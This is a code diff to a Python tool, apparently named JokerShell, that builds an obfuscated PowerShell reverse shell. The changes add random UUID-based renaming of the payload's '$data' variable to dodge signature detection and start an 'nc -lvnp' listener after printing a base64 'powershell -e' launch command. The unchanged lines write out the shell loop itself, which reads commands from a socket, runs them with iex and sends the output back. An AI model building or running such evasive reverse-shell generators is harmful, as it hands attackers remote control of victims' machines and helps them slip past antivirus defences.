@@ -1,5 +1,6 @@
 import random
 import time
+import uuid
 import base64
 import argparse
 import logging
@@ -39,6 +40,13 @@ MAIN = "├──"
 TEE2 = "└──"
 SPACE_PREFIX = "   "
 
+# Generate a list of 10 UUIDs to be randomly given when code runs
+random_uuid = []
+for uid in range(10):
+    random_uuid.append("$" + str(uuid.uuid4()))
+random_uid_get = random.choice(random_uuid)
+print(f"\nRandomly UUID => {random_uid_get}"), time.sleep(0.7)
+split_uuid = random_uid_get.split("-")[0]
 
 def JOKER():
     print(f'''
@@ -68,8 +76,8 @@ def Bomb():
         logger.info(f"\n{Red}{MAIN}{Normal} Calculating Strings...")
         with open('Payload.ps1', 'r') as file:
             spl = file.read()
-            words_to_check = ["SYSTEMROOT", "New-Object", "GetStream", "ASCII", "System.Net.Sockets", "$client", "$sendback"]
-            word_to_update = [repl, repl3, repl5, repl6, repl4, repl7, repl8]
+            words_to_check = ["SYSTEMROOT", "New-Object", "GetStream", "ASCII", "System.Net.Sockets", "$client", "$sendback", "$data"]
+            word_to_update = [repl, repl3, repl5, repl6, repl4, repl7, repl8, repl9]
             num_words_to_check = len(words_to_check)
             time.sleep(1)
             print(f"{SPACE_PREFIX}{Yellow}{TEE2}{Normal}Checks For Replaceable Words....")
@@ -138,6 +146,9 @@ WordCharSystem7 = ["$41b394758330c8=$3757856aa482c79977", "$37f=$91a10810c37a0f=
 WordCharSystem8 = ["$3dbfe2ebffe072727949d7cecc51573b", "$b15ff490cfd2aa65358d2e5e376c5dd2",
                    "$b91ae5f2a05e87e53ef4ca58305c600f", "$fb3c97733989bd69eede22507aab10df"
                    ]
+
+WordCharSystem9 = split_uuid
+
 # --------------------- Join List Together --------------------- #
 C1 = ''.join(Command1).strip()
 C2 = ''.join(Command2).strip()
@@ -199,7 +210,7 @@ def Execute_Payload():
         run2.write(f"$StReAm = $client.{repl5}();[byte[]]$bytes = 0..65535|%" + "{0};\n")
         run2.write(f"while(($i = $StREaM.ReAd($bytes, 0, $bytes.LeNgTh)) -ne 0)" + "{;\n")
         run2.write(f"$data = ({repl3} -TypENAme " + f"{repl6}).('Ge'+'tStRinG')($bytes,0, $i);\n")
-        run2.write(f'''$sendback = (iex ". {{  $DATA  }} 2>&1" | Ou''t-Str''ing );\n''')
+        run2.write(f'''$sendback = (iex ". {{  $data  }} 2>&1" | Ou''t-Str''ing );\n''')
         run2.write(f"$J=$O=$K=$E=$R=$P=$W=$R = ${{sendback}} + '{LightBlue}JokerShell{Normal} ' + (pwd).Path + '> ';\n")
         run2.write("$s = ('{0}{1}{2}{3}'-f 't','e','x','t'); $sendbyte = ([text.encoding]::ASCii).GetBYTeS($R);\n")
         run2.write("$stREaM.Write($sendbyte,0,$seNdByte.Length);$sTREaM.Flush()};$client.Close()\n")
@@ -208,20 +219,22 @@ def Execute_Payload():
 
 repl7 = None
 repl8 = None
+repl9 = None
 def Change_Payload(x):
-    global repl7, repl8
+    global repl7, repl8, repl9
     # Make Random MD5 Value Variables
     repl7 = random.choice(WordCharSystem7)
     repl8 = random.choice(WordCharSystem8)
-    # Change After .ps1 File Has Been Made
-    with open(x, "r") as run3:
-        file_content = run3.read()
-    new_content = file_content.replace("$client", repl7)
-    new_content2 = new_content.replace("$sendback", repl8)
-    new_content3 = new_content2.replace("sendback", repl8.split("$")[1])
-    with open(x, 'w') as run4:
-        run4.write(new_content3)
-    run3.close()
+    repl9 = WordCharSystem9
+    with open(x, "r") as file:
+        file_content = file.read()
+    file_content = file_content.replace("$client", repl7)
+    file_content = file_content.replace("$sendback", repl8)
+    file_content = file_content.replace("sendback", repl8.split("$")[1])
+    file_content = file_content.replace("$data", repl9)
+    with open(x, 'w') as file:
+        file.write(file_content)
+    file.close()
 
 def Raw_Payload(x):
     with open(x, "r") as f:
@@ -257,6 +270,8 @@ def main():
         print(f"powershell -e {base_bytes.decode('utf-8')}")
     time.sleep(0.5)
     subprocess.Popen('rm -r Payload.ps1', shell=True)
+    process = subprocess.Popen(['nc', '-lvnp', f'{args.p}'])
+    process.wait()
 
 if __name__ == '__main__':
     main()
